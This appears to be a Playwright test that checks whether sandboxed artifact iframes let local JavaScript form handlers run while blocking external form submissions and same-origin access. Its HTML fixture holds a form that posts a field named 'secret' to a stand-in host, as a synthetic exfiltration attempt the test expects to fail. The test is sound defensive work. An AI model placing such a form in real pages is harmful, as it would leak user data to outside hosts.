// Native submit handlers must work, while actual form navigation stays blocked.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import ts from 'typescript';
import {webcrypto} from 'node:crypto';
import {chromium} from 'playwright';
const source=fs.readFileSync(new URL('../../utils/artifactIframe.ts',import.meta.url),'utf8');
const compiled=ts.transpileModule(source,{compilerOptions:{module:ts.ModuleKind.CommonJS,target:ts.ScriptTarget.ES2022}}).outputText;
const sandbox={exports:{},crypto:webcrypto,window:{location:{origin:'https://assets.example.test'}}};
vm.runInNewContext(compiled,sandbox);
const policies=[...new Set(['../../components/dashboard/ArtifactFrame.vue','../../pages/r/[id]/index.vue'].flatMap(p=>[...fs.readFileSync(new URL(p,import.meta.url),'utf8').matchAll(/\bsandbox="([^"]+)"/g)].map(m=>m[1])))];
assert.ok(policies.length);
const browser=await chromium.launch({headless:true});
try{
 for(const policy of policies){
  assert.ok(!policy.includes('allow-same-origin'));
  for(const mode of ['page','slides']){
   const page=await browser.newPage();let externalRequests=0;
   await page.route('**/*',route=>{if(route.request().url().startsWith('https://blocked.example.test'))externalRequests++;return route.fulfill({status:200,body:''});});
   const html=sandbox.exports.buildArtifactIframeHtml({mode,data:{visualizations:[]},code:`<form id="local"><input required name="title"><button>Save</button></form><output id="result"></output><form action="https://blocked.example.test/collect" method="post"><input name="secret" value="synthetic"><button>Send externally</button></form><script>document.querySelector('#local').addEventListener('submit',e=>{e.preventDefault();document.querySelector('#result').textContent='saved'});window.violations=[];document.addEventListener('securitypolicyviolation',e=>window.violations.push(e.effectiveDirective));</script>`});
   await page.setContent('<iframe></iframe>');
   await page.locator('iframe').evaluate((el,{html,policy})=>{el.setAttribute('sandbox',policy);el.srcdoc=html},{html,policy});
   const frame=page.frameLocator('iframe');
   await frame.locator('input[name=title]').fill('Ordinary form input');
   await frame.getByRole('button',{name:'Save',exact:true}).click();
   await frame.getByText('saved',{exact:true}).waitFor({timeout:2000});
   await frame.getByRole('button',{name:'Send externally',exact:true}).click();
   const child=page.frames().find(f=>f.parentFrame());
   await child.waitForFunction(()=>window.violations.includes('form-action'),{timeout:2000});
   assert.equal(externalRequests,0);
   await page.close();
  }
 }
 console.log('PASS: page and slide JavaScript form handlers work; external form submissions and same-origin privilege remain blocked');
}finally{await browser.close()}
